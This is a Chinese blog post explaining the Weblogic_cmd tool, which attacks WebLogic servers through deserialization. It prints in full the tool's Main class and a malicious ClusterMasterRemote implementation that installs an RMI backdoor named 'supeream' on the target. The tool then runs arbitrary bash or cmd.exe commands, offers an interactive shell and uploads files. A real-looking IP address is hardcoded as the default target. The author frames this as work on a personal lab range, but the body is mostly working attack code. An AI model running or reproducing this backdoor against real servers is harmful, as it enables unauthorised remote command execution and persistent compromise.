前言Weblogic_cmd是一款用于webloigc命令执行的工具，和ysoserial一样，当时是因为自己搭建的webloigc靶场用的是jdk8u202，版本比较高，工具默认的链子是CC1，打不通，所以自己小改了一下CC6，并且分析了一下Payload生成流程;之后用Weblogic结合RMI回显又需要改一下，踩得坑还挺多的，总结一下
Weblogic_cmd各模块讲解Mainpackage com.supeream;import com.supeream.serial.BytesOperation;import com.supeream.ssl.WeblogicTrustManager;import com.supeream.weblogic.WebLogicOperation;import org.apache.commons.cli.*;import weblogic.cluster.singleton.ClusterMasterRemote;import weblogic.jndi.Environment;import weblogic.utils.encoders.BASE64Encoder;import javax.naming.Context;import javax.naming.NamingException;import java.io.FileNotFoundException;import java.util.ArrayList;import java.util.Arrays;import java.util.List;import java.util.Scanner;public class Main &#123;    public static final String JNDI_FACTORY = &quot;weblogic.jndi.WLInitialContextFactory&quot;;    public static String TYPE = &quot;marshall&quot;;    public static List&lt;String&gt; types = Arrays.asList(new String[]&#123;&quot;marshall&quot;, &quot;collection&quot;, &quot;streamMessageImpl&quot;&#125;);    public static String version;    public static CommandLine cmdLine;    private static String cmd = &quot;whoami&quot;;    public static Context getInitialContext(String url) throws NamingException, FileNotFoundException &#123;        Environment environment = new Environment();        environment.setProviderUrl(url);        environment.setEnableServerAffinity(false);        environment.setSSLClientTrustManager(new WeblogicTrustManager());        return environment.getInitialContext();    &#125;    public static boolean checkIsAlreadyInstalled(String host, String port) &#123;        try &#123;            System.out.println(&quot;检查是否安装rmi实例&quot;);            Context initialContext = getInitialContext(converUrl(host, port));            ClusterMasterRemote remoteCode = (ClusterMasterRemote) initialContext.lookup(&quot;supeream&quot;);            System.out.println(&quot;rmi已经安装&quot;);            invokeRmi(remoteCode);            return true;        &#125; catch (Exception e) &#123;            if (e.getMessage() !=null &amp;&amp; e.getMessage().contains(&quot;supeream&quot;)) &#123;                System.out.println(&quot;rmi实例不存在&quot;);            &#125; else &#123;                e.printStackTrace();//                System.exit(0);            &#125;        &#125;        return false;    &#125;    public static void executeBlind(String host, String port) throws Exception &#123;        if (cmdLine.hasOption(&quot;B&quot;) &amp;&amp; cmdLine.hasOption(&quot;C&quot;)) &#123;            System.out.println(&quot;执行命令:&quot; + cmdLine.getOptionValue(&quot;C&quot;));            WebLogicOperation.blindExecute(host, port, cmdLine.getOptionValue(&quot;C&quot;));            System.out.println(&quot;执行blind命令完成&quot;);            System.exit(0);        &#125;    &#125;    public static String converUrl(String host, String port) &#123;        if (cmdLine.hasOption(&quot;https&quot;)) &#123;            return &quot;t3s://&quot; + host + &quot;:&quot; + port;        &#125; else &#123;            return &quot;t3://&quot; + host + &quot;:&quot; + port;        &#125;    &#125;    private static String cdConcat(List&lt;String&gt; cds) &#123;        StringBuffer stringBuffer = new StringBuffer();        for (String cd: cds) &#123;            stringBuffer.append(cd);            stringBuffer.append(&quot;&amp;&amp;&quot;);        &#125;        return stringBuffer.toString();    &#125;    public static void invokeRmi(ClusterMasterRemote remoteCode) throws Exception &#123;        String result = null;        if (Main.cmdLine.hasOption(&quot;shell&quot;)) &#123;            Scanner scanner = new Scanner(System.in);            List&lt;String&gt; cacheCmds = new ArrayList&lt;String&gt;();            while (true) &#123;                System.out.print(&quot;please input cmd:&gt;&quot;);                cmd = scanner.nextLine();                if (cmd.equalsIgnoreCase(&quot;exit&quot;)) &#123;                    System.exit(0);                &#125;                if (cmd.startsWith(&quot;cd &quot;)) &#123;                    cacheCmds.add(cmd);                &#125;                if (cmd.equalsIgnoreCase(&quot;clear&quot;)) &#123;                    cacheCmds.clear();                    continue;                &#125;                if (cmd.equalsIgnoreCase(&quot;back&quot;)) &#123;                    cacheCmds.remove(cacheCmds.size()-1);                    continue;                &#125;                String newCmd = cdConcat(cacheCmds);                if (!cmd.startsWith(&quot;cd &quot;)) &#123;                    newCmd += cmd;                &#125; else if (newCmd.length()&gt;3)&#123;                    newCmd = newCmd.substring(0, newCmd.length()-2);                &#125;                if (Main.cmdLine.hasOption(&quot;noExecPath&quot;)) &#123;                    result = remoteCode.getServerLocation(&quot;showmecode$NO$&quot;+newCmd);                &#125; else &#123;                    result = remoteCode.getServerLocation(&quot;showmecode&quot;+newCmd);                &#125;                System.out.println(result);            &#125;        &#125;  else &#123;            System.out.println(&quot;执行命令:&quot; + cmd);            if (Main.cmdLine.hasOption(&quot;noExecPath&quot;)) &#123;                result = remoteCode.getServerLocation(&quot;showmecode$NO$&quot;+cmd);            &#125; else &#123;                result = remoteCode.getServerLocation(&quot;showmecode&quot;+cmd);            &#125;            System.out.println(result);        &#125;    &#125;    public static void main(String[] args) &#123;        System.setProperty(&quot;weblogic.security.allowCryptoJDefaultJCEVerification&quot;, &quot;true&quot;);        System.setProperty(&quot;weblogic.security.allowCryptoJDefaultPRNG&quot;, &quot;true&quot;);        System.setProperty(&quot;weblogic.security.SSL.ignoreHostnameVerification&quot;, &quot;true&quot;);        System.setProperty(&quot;weblogic.security.TrustKeyStore&quot;, &quot;DemoTrust&quot;);        Options options = new Options();        options.addOption(&quot;H&quot;, true, &quot;Remote Host[need set]&quot;);        options.addOption(&quot;P&quot;, true, &quot;Remote Port[need set]&quot;);        options.addOption(&quot;C&quot;, true, &quot;Execute Command[need set]&quot;);        options.addOption(&quot;T&quot;, true, &quot;Payload Type&quot; + types);        options.addOption(&quot;U&quot;, false, &quot;Uninstall rmi&quot;);        options.addOption(&quot;B&quot;, false, &quot;Runtime Blind Execute Command maybe you should select os type&quot;);        options.addOption(&quot;os&quot;, true, &quot;Os Type [windows,linux]&quot;);        options.addOption(&quot;https&quot;, false, &quot;enable https or tls&quot;);        options.addOption(&quot;shell&quot;, false, &quot;enable shell module&quot;);        options.addOption(&quot;upload&quot;, false, &quot;enable upload a file&quot;);        options.addOption(&quot;src&quot;, true, &quot;path to src file &quot;);        options.addOption(&quot;dst&quot;, true, &quot;path to dst file &quot;);        options.addOption(&quot;noExecPath&quot;, false, &quot;custom execute path&quot;);        try &#123;            String host = &quot;202.60.207.169&quot;;            String port = &quot;7001&quot;;            CommandLineParser parser = new DefaultParser();            cmdLine = parser.parse(options, args);            if (cmdLine.hasOption(&quot;H&quot;)) &#123;                host = cmdLine.getOptionValue(&quot;H&quot;);            &#125; else &#123;                HelpFormatter formatter = new HelpFormatter();                formatter.printHelp(&quot;supeream&quot;, options);                System.exit(0);            &#125;            if (cmdLine.hasOption(&quot;P&quot;)) &#123;                port = cmdLine.getOptionValue(&quot;P&quot;);            &#125;            if (cmdLine.hasOption(&quot;C&quot;)) &#123;                cmd = cmdLine.getOptionValue(&quot;C&quot;);            &#125;            if (cmdLine.hasOption(&quot;T&quot;)) &#123;                TYPE = cmdLine.getOptionValue(&quot;T&quot;);            &#125;            if (cmdLine.hasOption(&quot;U&quot;)) &#123;                System.out.println(&quot;开始删除rmi实例&quot;);                WebLogicOperation.unInstallRmi(host, port);                System.out.println(&quot;后门删除实例&quot;);                System.exit(0);            &#125;            executeBlind(host, port);            if (Main.cmdLine.hasOption(&quot;upload&quot;) &amp;&amp; Main.cmdLine.hasOption(&quot;src&quot;) &amp;&amp; Main.cmdLine.hasOption(&quot;dst&quot;)) &#123;                System.out.println(&quot;开始上传文件&quot;);                String path = Main.cmdLine.getOptionValue(&quot;src&quot;);                byte[] fileContent = BytesOperation.GetByteByFile(path);                WebLogicOperation.uploadFile(host, port, Main.cmdLine.getOptionValue(&quot;dst&quot;), fileContent);                System.out.println(&quot;file upload success&quot;);                System.exit(0);            &#125;            if (checkIsAlreadyInstalled(host, port)) &#123;                System.exit(0);            &#125;            System.out.println(&quot;开始安装rmi实例&quot;);            WebLogicOperation.installRmi(host, port);            System.out.println(&quot;等待rmi实例安装成功 &quot;);            Thread.sleep(2000);            Context initialContext = getInitialContext(converUrl(host, port));            ClusterMasterRemote remoteCode = (ClusterMasterRemote) initialContext.lookup(&quot;supeream&quot;);            invokeRmi(remoteCode);        &#125; catch (Exception e) &#123;            System.out.println(&quot;实例安装失败&quot;);            String msg = e.getMessage();            if (msg != null &amp;&amp; msg.contains(&quot;Unrecognized option&quot;)) &#123;                HelpFormatter formatter = new HelpFormatter();                formatter.printHelp(&quot;supeream&quot;, options);            &#125; else &#123;                System.out.println(&quot;实例rmi安装失败 请切换-OB模式&quot;);                e.printStackTrace();            &#125;        &#125;    &#125;&#125;
main方法就是程序启动类，它获取了你输入的cmdline的一系列参数，然后送往其他模块进行处理，其中的invokeRmi就是我说的官方自带的rmi回显策略，效果是一样，但是构造起来可能小偏差有一点，其他的就没什么好说的了，都是些通俗易懂的
PayloadPayload模块就是官方自带的Weblogic和RMI结合回显的策略
package com.supeream.payload;//import sun.tools.asm.TryData;import weblogic.cluster.singleton.ClusterMasterRemote;import weblogic.utils.encoders.BASE64Decoder;import javax.naming.Context;import javax.naming.InitialContext;import java.io.BufferedReader;import java.io.FileOutputStream;import java.io.InputStreamReader;import java.rmi.RemoteException;import java.util.ArrayList;import java.util.Arrays;import java.util.List;/** * Created by nike on 17/6/27. */public class RemoteImpl implements ClusterMasterRemote &#123;    public static void main(String[] args) &#123;        try &#123;            RemoteImpl remote = new RemoteImpl();            if (args.length == 2 &amp;&amp; args[0].equalsIgnoreCase(&quot;blind&quot;)) &#123;                remote.getServerLocation(args[1]);            &#125; else if (args.length == 1) &#123;                Context ctx = new InitialContext();                if (args[0].equalsIgnoreCase(&quot;install&quot;)) &#123;                    ctx.rebind(&quot;supeream&quot;, remote);                &#125; else if (args[0].equalsIgnoreCase(&quot;uninstall&quot;)) &#123;                    ctx.unbind(&quot;supeream&quot;);                &#125;            &#125;        &#125; catch (Exception e) &#123;        &#125;    &#125;    @Override    public void setServerLocation(String cmd, String args) throws RemoteException &#123;    &#125;    public static void uploadFile(String path, byte[] content) &#123;        try &#123;            FileOutputStream fileOutputStream = new FileOutputStream(path);            fileOutputStream.write(content);            fileOutputStream.flush();            fileOutputStream.close();        &#125;catch (Exception e) &#123;        &#125;    &#125;    @Override    public String getServerLocation(String cmd) throws RemoteException &#123;        try &#123;            if (!cmd.startsWith(&quot;showmecode&quot;)) &#123;                return &quot;guess me?&quot;;            &#125; else &#123;                cmd = cmd.substring(10);            &#125;            boolean isLinux = true;            String osTyp = System.getProperty(&quot;os.name&quot;);            if (osTyp != null &amp;&amp; osTyp.toLowerCase().contains(&quot;win&quot;)) &#123;                isLinux = false;            &#125;            List&lt;String&gt; cmds = new ArrayList&lt;String&gt;();            if (cmd.startsWith(&quot;$NO$&quot;)) &#123;                cmds.add(cmd.substring(4));            &#125;else if (isLinux) &#123;                cmds.add(&quot;/bin/bash&quot;);                cmds.add(&quot;-c&quot;);                cmds.add(cmd);            &#125; else &#123;                cmds.add(&quot;cmd.exe&quot;);                cmds.add(&quot;/c&quot;);                cmds.add(cmd);            &#125;            ProcessBuilder processBuilder = new ProcessBuilder(cmds);            processBuilder.redirectErrorStream(true);            Process proc = processBuilder.start();            BufferedReader br = new BufferedReader(new InputStreamReader(proc.getInputStream()));            StringBuffer sb = new StringBuffer();            String line;            while ((line = br.readLine()) != null) &#123;                sb.append(line).append(&quot;\n&quot;);            &#125;            return sb.toString();        &#125; catch (Exception e) &#123;            return e.getMessage();        &#125;    &#125;&#125;
这是官方自己构造的恶意远程类，和我们接下来要说的一样，都是构造了继承了ClusterMasterRemote，八九不离十
